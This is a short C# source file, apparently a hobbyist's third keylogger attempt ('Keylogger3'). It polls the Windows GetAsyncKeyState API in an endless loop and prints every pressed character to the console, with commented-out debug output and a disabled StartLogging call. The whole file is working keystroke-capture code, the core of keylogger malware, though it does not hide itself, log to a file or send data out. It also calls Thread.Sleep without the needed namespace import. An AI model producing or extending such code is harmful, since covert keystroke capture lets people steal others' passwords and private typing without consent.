using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger3 {
    class Program{
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(System.Int32 i);
        static void Main(string[] args){
            //StartLogging();
            int aux = 0;
            while (true) {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++){
                    int KeyState = GetAsyncKeyState(i);
                    //Console.Write(KeyState + ", ");
                    if (KeyState == 32768)  {
                        // Console.Write(KeyState + ", ");
                        // Console.Write(i + ", ");
                        // 32768
                        /*
                        Console.Write("\n--------------------------------");
                        Console.Write("\nKeyState   :   " + KeyState);
                        Console.Write("\n");
                        Console.Write("\n           " + (char) i );
                        Console.Write("\n           " + aux );
                        */
                        Console.Write((char)i);
                        aux++;
                        break;
                        //Console.Write("\n--------------------------------");

                    }
                }
            }
        }
    }
}